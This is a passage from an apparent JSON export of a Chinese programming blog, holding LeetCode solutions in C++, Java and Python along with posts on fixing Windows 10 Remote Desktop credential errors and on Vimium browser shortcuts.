&lt;= n) &#123; sum_array[x] += val; x += lowbit(x); &#125; &#125; int sum(int x) &#123; int res = 0; while (x &gt; 0) &#123; res += sum_array[x]; x -= lowbit(x); &#125; return res; &#125;&#125;;class Solution &#123;public: vector&lt;int&gt; countSmaller(vector&lt;int&gt;&amp; nums) &#123; vector&lt;int&gt; temp_num = nums; sort(temp_num.begin(), temp_num.end()); unordered_map&lt;int,int&gt; dic; for (int i = 0; i &lt; temp_num.size(); i++) dic[temp_num[i]] = i + 1; FenwickTree tree(nums.size()); vector&lt;int&gt; ans(nums.size(),0); for (int i = nums.size() - 1; i &gt;= 0; i--) &#123; ans[i] = tree.sum(dic[nums[i]] - 1); tree.add(dic[nums[i]],1); &#125; return ans; &#125;&#125;; Python 1234567891011121314151617181920212223242526272829303132333435class FenwickTree(object): def __init__(self, n): self.sum_array = [0] * (n + 1) self.n = n def lowbit(self, x): return x &amp; -x def add(self, x, val): while x &lt;= self.n: self.sum_array[x] += val x += self.lowbit(x) def sum(self, x): res = 0 while x &gt; 0: res += self.sum_array[x] x -= self.lowbit(x) return resclass Solution(object): def countSmaller(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: List[int] &quot;&quot;&quot; dic = &#123;&#125; for i, num in enumerate(sorted(list(set(nums)))): dic[num] = i + 1 tree = FenwickTree(len(nums)) ans = [0] * len(nums) for i in xrange(len(nums) - 1, -1, -1): ans[i] = tree.sum(dic[nums[i]] - 1) tree.add(dic[nums[i]], 1) return ans","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"windows 10 远程桌面提示凭证无法工作解决办法","slug":"windows-10-remote-desktop-credential-not-work-solution","date":"2015-12-05T00:25:29.000Z","updated":"2021-01-08T13:42:14.037Z","comments":true,"path":"windows-10-remote-desktop-credential-not-work-solution/","link":"","permalink":"https://www.hrwhisper.me/windows-10-remote-desktop-credential-not-work-solution/","excerpt":"自从升级到windows 10，想要连接到很久不用的实验室的电脑，却发现了如下错误： 凭据不工作！为啥？我账号密码并没有错啊 windows-10-remote-desktop-credential-not-work 如何解决呢？","text":"自从升级到windows 10，想要连接到很久不用的实验室的电脑，却发现了如下错误： 凭据不工作！为啥？我账号密码并没有错啊 windows-10-remote-desktop-credential-not-work 如何解决呢？ 方法一 咱不用mstsc了！直接用teamviewer~ 而且有UWP版本 。 博主看了看自己手头上的 Lumia 1020 →_→ teamviewer 完全可以替代mstsc，个人免费。 最重要的是，teamviewer 有自己的服务器，不在同一个网段内还能用。 （在家里能用teamviewer连上实验室的电脑，而mstsc就不可以） 注册个账户，然后在计算机上登录，记住该计算机，只要该计算机在线就可以远程！ 方法二 虽然用teamviewer 替代是个好方法，但不清楚为嘛凭据错误就是很不爽啊~ 找了半天，发现是用 联网账户 登录造成的。 在百度经验上找到相关的说明： http://jingyan.baidu.com/article/5d368d1ef177d03f61c05740.html 它说的解决办法是在设置-账户-改用本地账户登录 即可（亲测确实可以） 但是，我就是想用在线账户怎么办！ 博主又看了看手头上的 Lumia 1020 →_→ 在这里找到了解决方法：http://answers.microsoft.com/en-us/windows/forum/windows_8-networking/i-am-having-issues-trying-to-set-up-remote-desktop/6fb05624-3e39-48a9-9e31-a627023ee08d 方法是在用户名上 LOCALACCOUNT localaccount(小写的也行 ) 如图 windows-10-remote-desktop-credential-not-work-solution-online-username-use-localaccount","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"问题解决","slug":"others/问题解决","permalink":"https://www.hrwhisper.me/categories/others/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"}],"tags":[{"name":"windows10","slug":"windows10","permalink":"https://www.hrwhisper.me/tags/windows10/"}]},{"title":"leetcode Super Ugly Number","slug":"leetcode-super-ugly-number","date":"2015-12-03T04:46:26.000Z","updated":"2021-01-08T13:32:16.871Z","comments":true,"path":"leetcode-super-ugly-number/","link":"","permalink":"https://www.hrwhisper.me/leetcode-super-ugly-number/","excerpt":"leetcode Super Ugly Number Write a program to find the nth super ugly number. Super ugly numbers are positive numbers whose all prime factors are in the given prime list primes of size k. For example, [1, 2, 4, 7, 8, 13, 14, 16, 19, 26, 28, 32]is the sequence of the first 12 super ugly numbers given primes = [2, 7, 13, 19] of size 4. Note: (1) 1 is a super ugly number for any given primes. (2) The given numbers in primes are in ascending order. (3) 0 &lt; k ≤ 100, 0 &lt; n ≤ 106, 0 &lt; primes[i] &lt; 1000.","text":"leetcode Super Ugly Number Write a program to find the nth super ugly number. Super ugly numbers are positive numbers whose all prime factors are in the given prime list primes of size k. For example, [1, 2, 4, 7, 8, 13, 14, 16, 19, 26, 28, 32]is the sequence of the first 12 super ugly numbers given primes = [2, 7, 13, 19] of size 4. Note: (1) 1 is a super ugly number for any given primes. (2) The given numbers in primes are in ascending order. (3) 0 &lt; k ≤ 100, 0 &lt; n ≤ 106, 0 &lt; primes[i] &lt; 1000. 题目地址: leetcode Super Ugly Number 题意： 给定因子Primes , 让你求第n个super ugly number。 super ugly number定义为：整数，且因子全部都在primes中。 注意1为特殊的super ugly number。 思路： 和 leetcode Ugly Number II 思路一样，要使得super ugly number 不漏掉，那么用每个因子去乘第一个，当前因子乘积是最小后，乘以下一个.....以此类推。 C++ 123456789101112131415161718192021222324252627282930struct Node &#123; int i; int val; int prime; Node(int i, int val, int prime) :i(i), val(val), prime(prime) &#123;&#125; bool operator &lt; (const Node &amp; b) const &#123; return val &gt; b.val; &#125;&#125;;class Solution &#123;public: int nthSuperUglyNumber(int n, vector&lt;int&gt;&amp; primes) &#123; priority_queue&lt;Node&gt; q; for (int prime : primes) q.push(Node(0, prime, prime)); vector&lt;int&gt; ans(n, 1); for (int i = 1; i &lt; n; i++) &#123; Node cur = q.top(); q.pop(); ans[i] = cur.val; while (!q.empty() &amp;&amp; q.top().val == cur.val) &#123; Node t = q.top(); q.pop(); t.val = ans[++t.i] * t.prime; q.push(t); &#125; cur.val = ans[++cur.i] * cur.prime; q.push(cur); &#125; return ans[n - 1]; &#125;&#125;; Java 12345678910111213141516171819202122232425262728293031323334353637class Solution &#123; public int nthSuperUglyNumber(int n, int[] primes) &#123; int[] ans = new int[n]; ans[0] = 1; PriorityQueue&lt;Node&gt; q = new PriorityQueue&lt;Node&gt;(); for (int prime : primes) q.add(new Node(0, prime, prime)); for (int i = 1; i &lt; n; i++) &#123; Node cur = q.poll(); ans[i] = cur.val; while (!q.isEmpty() &amp;&amp; q.peek().val == cur.val) &#123; Node t = q.poll(); t.val = ans[++t.i] * t.prime; q.add(t); &#125; cur.val = ans[++cur.i] * cur.prime; q.add(cur); &#125; return ans[n - 1]; &#125;&#125;class Node implements Comparable&lt;Node&gt; &#123; int i; int val; final int prime; public Node(int i, int val, int prime) &#123; this.i = i; this.val = val; this.prime = prime; &#125; @Override public int compareTo(Node o) &#123; return this.val - o.val; &#125;&#125; Python 12345678910111213141516171819202122class Solution(object): def nthSuperUglyNumber(self, n, primes): &quot;&quot;&quot; :type n: int :type primes: List[int] :rtype: int &quot;&quot;&quot; ans = [1] * n q = [[prime, 0, prime] for prime in primes] heapq.heapify(q) for i in range(1, n): cur = heapq.heappop(q) ans[i] = cur[0] while q and q[0][0] == ans[i]: t = heapq.heappop(q) t[1] += 1 t[0] = ans[t[1]] * t[2] heapq.heappush(q, t) cur[1] += 1 cur[0] = ans[cur[1]] * cur[2] heapq.heappush(q, cur) return ans[n - 1]","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Ugly Number I II","slug":"leetcode-ugly-number-i-ii","date":"2015-12-03T02:55:14.000Z","updated":"2021-01-08T13:32:16.846Z","comments":true,"path":"leetcode-ugly-number-i-ii/","link":"","permalink":"https://www.hrwhisper.me/leetcode-ugly-number-i-ii/","excerpt":"leetcode Ugly Number Write a program to check whether a given number is an ugly number. Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. For example, 6, 8 are ugly while 14 is not ugly since it includes another prime factor 7. Note that 1 is typically treated as an ugly number.","text":"leetcode Ugly Number Write a program to check whether a given number is an ugly number. Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. For example, 6, 8 are ugly while 14 is not ugly since it includes another prime factor 7. Note that 1 is typically treated as an ugly number. 题目地址: leetcode Ugly Number 题意： Ugly numbers 是一个只能被2，3，5整除的数，给你一个数，判断是否是 ugly number 思路： 直接分别除2，3，5。。。看看最后是不是1 注意0的情况 C++ 123456789class Solution &#123;public: bool isUgly(int num) &#123; if(num == 0) return false; for (int x : vector&lt;int&gt;&#123;2,3,5&#125;) while (num % x == 0) num /= x; return num == 1; &#125;&#125;; Java 12345678class Solution &#123; public boolean isUgly(int num) &#123; if(num == 0) return false; for (int x : new int[]&#123;2, 3, 5&#125;) while (num % x == 0) num /= x; return num == 1; &#125;&#125; Python 1234567891011class Solution(object): def isUgly(self, num): &quot;&quot;&quot; :type num: int :rtype: bool &quot;&quot;&quot; if not num: return False for x in (2, 3, 5): while num % x == 0: num /= x return num == 1; 264. Ugly Number II Write a program to find the n-th ugly number. Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. For example, 1, 2, 3, 4, 5, 6, 8, 9, 10, 12 is the sequence of the first 10 ugly numbers. Note that 1 is typically treated as an ugly number. 题目地址: leetcode Ugly Number II 题意： Ugly numbers 是一个只能被2，3，5整除的数，求第n个Ugly number 思路： 方法1 优先队列，每次取出当前的ugly number，然后乘上2,3,5 *2：肯定是没放入队列中的 *3：若一个数不是6的倍数，那么说明肯定没有加入队列中，可以加入 *5：若不是10或者15的倍数，说明也没加入到队列中 复杂度：nlogn 12345678910111213141516171819202122class Solution &#123;public: int nthUglyNumber(int n) &#123; priority_queue&lt;long long&gt; q; q.push(-1); while (--n &gt; 0) &#123; long long x = -q.top(); q.pop(); long long a = x * 2; long long b = x * 3; long long c = x * 5; q.push(-a); if (b % 6 != 0) &#123; q.push(-b); &#125; if (c % 10 != 0 &amp;&amp; c % 15 != 0) &#123; q.push(-c); &#125; &#125; return -q.top(); &#125;&#125;; 方法2： 我们来看看，要如何求第n个ugly number. 第一个ugly number 是1 我们讨论n大于1的情况 因为它只能被2，3，5整除，所以我们从1开始扩展，每次要么乘2，要么乘3，要么乘5. 对于1来说，我们分别乘以2，3，5得到[2,3,5]，显然2是最小的。 于是第2个ugly number是2。 接着第3个呢？显然是 3 . 从 1 * 3 得到 第4个就不一样了，它是从2*2得到。 这有什么规律呢？规律就是，每个因子分别乘以当前得到的ugly number（初始为1），当某因子x算出来的不大于其他两个因子，说明新的ugly number是当前因子算出来的，下一轮，该因子应该乘以之前ugly number的下一个。 换句话说，每个因子分别乘以对应的ugly number[i]后，如果得到了新的ugly number 就说明下一次应该乘以下一个（ugly number[i+1]）。这样能保证乘出来的小而且不会漏掉。 另一种理解：一个丑数*2， *3， *5 就会得到另外的一个丑数，那么已知n个丑数，要得到n + 1个丑数的时候，必然是从前n个丑数*2， *3， *5 得到的。因此就变成了一个合并三个有序数组的问题：维护三个指针a, b, c，比较各自*2， *3， *5 得到的值最小（设为cur），则放入第 n + 1个位置。同时，为了不产生重复解，下面的代码用了if而不是else if来跳过重复解。 详见代码： C++ 123456789101112131415class Solution &#123;public: int nthUglyNumber(int n) &#123; vector&lt;int&gt; dp(n, 1); int a = 0, b = 0, c = 0; for (int i = 1; i &lt; n; ++i) &#123; int cur = min(&#123;dp[a] * 2, dp[b] * 3, dp[c] * 5&#125;); if (cur == dp[a] * 2) ++a; if (cur == dp[b] * 3) ++b; if (cur == dp[c] * 5) ++c; dp[i] = cur; &#125; return dp.back(); &#125;&#125;; Java 123456789101112131415class Solution &#123; public int nthUglyNumber(int n) &#123; int[] ans = new int[n]; ans[0] = 1; int a = 0, b = 0, c = 0; for (int i = 1; i &lt; n; i++) &#123; int cur = Math.min(ans[a] * 2, Math.min(ans[b] * 3, ans[c] * 5)); ans[i] = cur; if (ans[a] * 2 == cur) a++; if (ans[b] * 3 == cur) b++; if (ans[c] * 5 == cur) c++; &#125; return ans[n - 1]; &#125;&#125; Python 1234567891011121314class Solution(object): def nthUglyNumber(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; a = b = c = 0 ans = [1] * n for i in range(1, n): ans[i] = min(ans[a] * 2, ans[b] * 3, ans[c] * 5) if ans[a] * 2 == ans[i]: a += 1 if ans[b] * 3 == ans[i]: b += 1 if ans[c] * 5 == ans[i]: c += 1 return ans[n - 1] 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Burst Balloons","slug":"leetcode-burst-balloons","date":"2015-11-29T23:58:11.000Z","updated":"2021-01-08T13:32:16.828Z","comments":true,"path":"leetcode-burst-balloons/","link":"","permalink":"https://www.hrwhisper.me/leetcode-burst-balloons/","excerpt":"leetcode Burst Balloons Given n balloons, indexed from 0 to n-1. Each balloon is painted with a number on it represented by array nums. You are asked to burst all the balloons. If the you burst balloon i you will get nums[left] * nums[i] * nums[right] coins. Here left and right are adjacent indices of i. After the burst, the left and right then becomes adjacent. Find the maximum coins you can collect by bursting the balloons wisely. Note: (1) You may imagine nums[-1] = nums[n] = 1. They are not real therefore you can not burst them. (2) 0 ≤ n ≤ 500, 0 ≤ nums[i] ≤ 100 Example: Given [3, 1, 5, 8] Return 167 12 nums &#x3D; [3,1,5,8] --&gt; [3,5,8] --&gt; [3,8] --&gt; [8] --&gt; []coins &#x3D; 3*1*5 + 3*5*8 + 1*3*8 + 1*8*1 &#x3D; 167","text":"leetcode Burst Balloons Given n balloons, indexed from 0 to n-1. Each balloon is painted with a number on it represented by array nums. You are asked to burst all the balloons. If the you burst balloon i you will get nums[left] * nums[i] * nums[right] coins. Here left and right are adjacent indices of i. After the burst, the left and right then becomes adjacent. Find the maximum coins you can collect by bursting the balloons wisely. Note: (1) You may imagine nums[-1] = nums[n] = 1. They are not real therefore you can not burst them. (2) 0 ≤ n ≤ 500, 0 ≤ nums[i] ≤ 100 Example: Given [3, 1, 5, 8] Return 167 12 nums &#x3D; [3,1,5,8] --&gt; [3,5,8] --&gt; [3,8] --&gt; [8] --&gt; []coins &#x3D; 3*1*5 + 3*5*8 + 1*3*8 + 1*8*1 &#x3D; 167 题目地址： leetcode Burst Balloons 题意： 给定n个气球。每次你可以打破一个，打破第i个，那么你会获得nums[left] * nums[i] * nums[right]个积分。 （nums[-1] = nums[n] = 1）求你可以获得的最大积分数 思路: 一开始想dp[i][j] 为第 i 天打破第j 个气球，然后枚举上一轮打破的为第k个气球 dp[i][j] =max( dp[i - 1][k] + left * nums[j] * right) （当然要记录都打了哪些O） 复杂度 O(n^3) 然而TLE (python) 看了discuss是dp[i][j]为打破的气球为i~j之间。 我们可以想象：最后的剩下一个气球为i的时候，可以获得的分数为：nums[-1]*nums[i]*nums[n]. 那么介于i,j之间的x，有： dp[i][j] = max(dp[i][j], dp[i][x - 1] + nums[i - 1] * nums[x] * nums[j + 1] + dp[x + 1][j]); 这里，为了方便代码书写，我在首尾插入了两个1，所以答案是dp[1][n](n为原来的长度) 可以用记忆化搜索也可以直接迭代DP,当然，记忆化搜索更好理解一点。 Divide and Conquer 记忆化搜索 Java 18ms 123456789101112131415161718public class Solution &#123; public int DP(int i, int j, int[] nums, int[][] dp) &#123; if (dp[i][j] &gt; 0) return dp[i][j]; for (int x = i; x &lt;= j; x++) &#123; dp[i][j] = Math.max(dp[i][j], DP(i, x - 1, nums, dp) + nums[i - 1] * nums[x] * nums[j + 1] + DP(x + 1, j, nums, dp)); &#125; return dp[i][j]; &#125; public int maxCoins(int[] iNums) &#123; int n = iNums.length; int[] nums = new int[n + 2]; for (int i = 0; i &lt; n; i++) nums[i + 1] = iNums[i]; nums[0] = nums[n + 1] = 1; int[][] dp = new int[n + 2][n + 2]; return DP(1, n, nums, dp); &#125;&#125; C++ 76ms 123456789101112131415161718class Solution &#123;public: int DP(int i, int j, const vector&lt;int&gt; &amp;nums, vector&lt;vector&lt;int&gt; &gt; &amp;dp) &#123; if (dp[i][j] &gt; 0) return dp[i][j]; for (int x = i; x &lt;= j; x++) &#123; int temp = DP(i, x - 1, nums, dp) + nums[i - 1] * nums[x] * nums[j + 1] + DP(x + 1, j, nums, dp); if (temp &gt; dp[i][j]) dp[i][j] = temp; &#125; return dp[i][j]; &#125; int maxCoins(vector&lt;int&gt;&amp; nums) &#123; int n = nums.size(); nums.insert(nums.begin(), 1); nums.insert(nums.end(), 1); vector&lt;vector&lt;int&gt; &gt; dp(n + 2, vector&lt;int&gt;(n + 2, 0)); return DP(1, n, nums, dp); &#125;&#125;; Python 1100ms 12345678910111213141516class Solution(object): def maxCoins(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; n = len(nums) nums = [1] + nums + [1] dp = [[0 for j in xrange(n + 2)] for i in xrange(n + 2)] def DP(i, j): if dp[i][j] &gt; 0: return dp[i][j] for x in xrange(i, j + 1): dp[i][j] = max(dp[i][j],DP(i, x - 1) + nums[i - 1] * nums[x] * nums[j + 1]+ DP(x + 1, j)) return dp[i][j] return DP(1,n) DP C++跑1330MS ，JAVA 187MS ，python TLE 。。。。python TLE 可以理解，但C++比JAVA这题还慢这不合理。。。。可能是vector太慢？ update at 2015.12.22 :重新提交发现跑快了,目测为了照顾python 把数据量降下来了 Java 15ms 123456789101112131415161718public class Solution &#123; public int maxCoins(int[] iNums) &#123; int n = iNums.length; int[] nums = new int[n + 2]; for (int i = 0; i &lt; n; i++) nums[i + 1] = iNums[i]; nums[0] = nums[n + 1] = 1; int[][] dp = new int[n + 2][n + 2]; for (int k = 1; k &lt;= n; k++) &#123; for (int i = 1; i &lt;= n - k + 1; i++) &#123; int j = i + k - 1; for (int x = i; x &lt;= j; x++) &#123; dp[i][j] = Math.max(dp[i][j], dp[i][x - 1] + nums[i - 1] * nums[x] * nums[j + 1] + dp[x + 1][j]); &#125; &#125; &#125; return dp[1][n]; &#125;&#125; C++ 36ms 1234567891011121314151617181920class Solution &#123;public: int maxCoins(vector&lt;int&gt;&amp; nums) &#123; int n &#x3D; nums.size(); nums.insert(nums.begin(), 1); nums.insert(nums.end(), 1); vector&lt;vector&lt;int&gt; &gt; dp(n + 2, vector&lt;int&gt;(n + 2, 0)); for (int k &#x3D; 1; k &lt;&#x3D; n; k++) &#123; for (int i &#x3D; 1; i &lt;&#x3D; n - k + 1; i++) &#123; int j &#x3D; i + k - 1; for (int x &#x3D; i; x &lt;&#x3D; j; x++) &#123; int temp &#x3D; dp[i][x - 1] + nums[i - 1] * nums[x] * nums[j + 1] + dp[x + 1][j]; if (dp[i][j] &lt; temp) dp[i][j] &#x3D; temp; &#125; &#125; &#125; return dp[1][n]; &#125;&#125;;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"Chrome Vimium 插件","slug":"chrome-plugin-vimium","date":"2015-11-28T10:19:37.000Z","updated":"2021-01-08T13:42:14.079Z","comments":true,"path":"chrome-plugin-vimium/","link":"","permalink":"https://www.hrwhisper.me/chrome-plugin-vimium/","excerpt":"Chrome 下的 Vimium 插件 可以让你在浏览 网页的时候 摆脱鼠标的使用。 博主现在拿着无线键盘，都比较随意的拿起键盘放在舒适的位置。 有时候离鼠标比较远，浏览个网页点击然后再去拿鼠标是很不爽的~~~ 于是，该神器登场的时候到了 ~","text":"Chrome 下的 Vimium 插件 可以让你在浏览 网页的时候 摆脱鼠标的使用。 博主现在拿着无线键盘，都比较随意的拿起键盘放在舒适的位置。 有时候离鼠标比较远，浏览个网页点击然后再去拿鼠标是很不爽的~~~ 于是，该神器登场的时候到了 ~ 快速打开网页链接 如图，按下f ，会显示对应的链接快捷键！ chrome-plugin-vimium-esc+f 直接输入对应链接的字母，浏览器自动打开它！ 这样就摆脱了鼠标啦！ 常用快捷键 比如 yy：复制当前网址 gs 查看当前网站源代码 hjkl: 对应vim 的方向键 等等 还有很多快捷键，你可以按下 ? 来查看 博主建议和chrome自带的快捷键结合。 比如用惯了chrome查找的ctrl + f 查找，不一定非得插件的 / ， 用习惯了 方向键和 home end 到最上最下不一定得gg 和G Navigating the current page: 123456789101112131415161718? show the help dialog for a list of all available keysh scroll leftj scroll downk scroll upl scroll rightgg scroll to top of the pageG scroll to bottom of the paged scroll down half a pageu scroll up half a pagef open a link in the current tabF open a link in a new tabr reloadgs view sourcei enter insert mode -- all commands will be ignored until you hit Esc to exityy copy the current url to the clipboardyf copy a link url to the clipboardgf cycle forward to the next framegF focus the main&#x2F;top frame Navigating to new pages: 1234o Open URL, bookmark, or history entryO Open URL, bookmark, history entry in a new tabb Open bookmarkB Open bookmark in a new tab Using find: 1234&#x2F; enter find mode -- type your search query and hit enter to search, or Esc to canceln cycle forward to the next find matchN cycle backward to the previous find match 更多内容可以看 https://github.com/philc/vimium/blob/master/README.md","categories":[{"name":"生产力","slug":"生产力","permalink":"https://www.hrwhisper.me/categories/%E7%94%9F%E4%BA%A7%E5%8A%9B/"}],"tags":[{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"}]},{"title":"leetcode Minimum Height Trees","slug":"leetcode-minimum-height-trees","date":"2015-11-26T09:13:18.000Z","updated":"2021-01-08T13:32:16.855Z","comments":true,"path":"leetcode-minimum-height-trees/","link":"","permalink":"https://www.hrwhisper.me/leetcode-minimum-height-trees/","excerpt":"leetcode Minimum Height Trees For a undirected graph with tree characteristics, we can choose any node as the root. The result graph is then a rooted tree. Among all possible rooted trees, those with minimum height are called minimum height trees (MHTs). Given such a graph, write a function to find all the MHTs and return a list of their root labels. Format The graph contains n nodes which are labeled from 0 to n - 1. You will be given the number n and a list of undirected edges (each edge is a pair of labels). You can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0] and thus will not appear together in edges. Example 1: Given n = 4, edges = [[1, 0], [1, 2], [1, 3]] 12345 0 1 &#x2F; \\2 3 return [1]","text":"leetcode Minimum Height Trees For a undirected graph with tree characteristics, we can choose any node as the root. The result graph is then a rooted tree. Among all possible rooted trees, those with minimum height are called minimum height trees (MHTs). Given such a graph, write a function to find all the MHTs and return a list of their root labels. Format The graph contains n nodes which are labeled from 0 to n - 1. You will be given the number n and a list of undirected edges (each edge is a pair of labels). You can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0] and thus will not appear together in edges. Example 1: Given n = 4, edges = [[1, 0], [1, 2], [1, 3]] 12345 0 1 &#x2F; \\2 3 return [1] Example 2: Given n = 6, edges = [[0, 3], [1, 3], [2, 3], [4, 3], [5, 4]] 12345670 1 2 \\ &#x2F; 3 4 5 return [3, 4] Hint: How many MHTs can a graph have at most? Note: According to the definition of tree on Wikipedia: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.” The height of a rooted tree is the number of edges on the longest downward path between the root and a leaf. 今天新出的题 leetcode Minimum Height Trees 题意： 给定一个n个结点n-1条边的无向图（就是树啦），让你找从哪个点出发，到其他结点的最长距离最小？（返回所有答案） 思路： 一开始类似RIP来更新距离，结果TLE。证明O(n^2)的复杂度太大 只好想其他的方法。 答案一定是最长距离的中间结点位置上。 我们要的是中间结点，沿着树的外围每次把叶子结点砍掉，那么，最后剩下的不就是中间结点了么？ Leetcode其他树的题： leetcode Tree 整理版 Code Python 1234567891011121314151617181920212223242526272829303132# leetcode Minimum Height Trees# https://www.hrwhisper.me/leetcode-minimum-height-trees/class Solution(object): def findMinHeightTrees(self, n, edges): &quot;&quot;&quot; :type n: int :type edges: List[List[int]] :rtype: List[int] &quot;&quot;&quot; if n==1: return [0] digree = [0 for i in xrange(n)] g = [[] for i in xrange(n)] for x,y in edges: digree[x] += 1 digree[y] += 1 g[x].append(y) #add_edge g[y].append(x) leaves = [i for i in xrange(n) if digree[i]==1] nodes = n while nodes &gt; 2: temp = [] for i in leaves: digree[i] = 0 nodes -= 1 for j in g[i]: digree[j] -= 1 if digree[j] == 1: temp.append(j) leaves = temp return leaves 附上一开始TLE的版本 思路就是类似于RIP算法，通过相邻的结点更新当前结点距离。 比如说有x ,y 一条边（以x=&gt;y举例，y=&gt;x同样进行更新） 我们可以通过y到各个结点的距离dis[y]来更新，就是说，让x走y这条边，然后到其他结点的距离(比如i)是不是比当前不走y到i的距离小。 于是有：dis[x][i] = dis[i][x] = min(dis[i][x], dis[i][y] + 1) (无向图对称性：dis[i][y] = dis[y][i] , dis[x][i] = dis[i][x]) 最后找最小的即可。 总复杂度：O(n^2) 1234567891011121314151617181920212223class Solution(object): def findMinHeightTrees(self, n, edges): &quot;&quot;&quot; :type n: int :type edges: List[List[int]] :rtype: List[int] &quot;&quot;&quot; INF = 0x7ffffffe dis = [[INF for j in xrange(n)] for i in xrange(n)] for i in xrange(n): dis[i][i] = 0 g = [[0 for j in xrange(n)] for i in xrange(n)] for x,y in edges: g[x][y] = g[y][x] = 1 for x,y in edges: dis[x][y] = dis[y][x] = 1 for i in xrange(n): dis[y][i] = dis[i][y] = min(dis[i][y], dis[i][x] + 1) dis[x][i] = dis[i][x] = min(dis[i][x], dis[i][y] + 1) nodes_height = [max(d) for d in dis] min_dis = min(nodes_height) return [i for i,c in enumerate(nodes_height) if c == min_dis]","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://www.hrwhisper.me/tags/Data-Structure/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Best Time to Buy and Sell Stock with Cooldown","slug":"leetcode-best-time-to-buy-and-sell-stock-with-cooldown","date":"2015-11-24T14:41:14.000Z","updated":"2021-01-08T13:32:16.892Z","comments":true,"path":"leetcode-best-time-to-buy-and-sell-stock-with-cooldown/","link":"","permalink":"https://www.hrwhisper.me/leetcode-best-time-to-buy-and-sell-stock-with-cooldown/","excerpt":"leetcode Best Time to Buy and Sell Stock with Cooldown Say you have an array for which the _i_th element is the price of a given stock on day i. Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times) with the following restrictions: You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again). After you sell your stock, you cannot buy stock on next day. (ie, cooldown 1 day) Example: prices = [1, 2, 3, 0, 2] maxProfit = 3 transactions = [buy, sell, cooldown, buy, sell]","text":"leetcode Best Time to Buy and Sell Stock with Cooldown Say you have an array for which the _i_th element is the price of a given stock on day i. Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times) with the following restrictions: You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again). After you sell your stock, you cannot buy stock on next day. (ie, cooldown 1 day) Example: prices = [1, 2, 3, 0, 2] maxProfit = 3 transactions = [buy, sell, cooldown, buy, sell] 题目地址：leetcode Best Time to Buy and Sell Stock with Cooldown 题意： 给定一个数组prices，prices[i]代表第i天股票的价格。让你进行若干次买卖，求最大利润 你每次只能买一支而且在再次买入之前必须出售之前手头上的股票（就是手头上最多有一支股票） 每次出售需要休息一天才能再次买入 Idea DP，we can create two array, buy and sell. buy[i] means we decide buy or no buy a stock at day i to maximize profits, and sell[i] means we sell or not sell a stock at day i to maximize profits. so, we have two equations : buy[i] = max(buy[i-1] , sell[i-2] - prices[i]) // So we should use sell[i-2] means we cooldown one day. sell[i] = max(sell[i-1], buy[i-1] + prices[i]) finally, it is obvious that sell[n-1] &gt;= buy[n-1],so we return sell[n-1] have more parctice in : leetcode Best Time to Buy and Sell Stock I ~ IV 思路 设sell[i] 卖出操作的最大利润。它需要考虑的是，第i天是否卖出。（手上有stock在第i天所能获得的最大利润） buy[i] 买进操作的最大利润。它需要考虑的是，第i天是否买进。（手上没有stock在第i天所能获得的最大利润） 所以，显然有状态转移方程 buy[i] = max(buy[i-1] , sell[i-2] - prices[i]) // 休息一天在买入，所以是sell[i-2]在状态转移 sell[i] = max(sell[i-1], buy[i-1] + prices[i]) 最后显然有sell[n-1] &gt; buy[n-1] 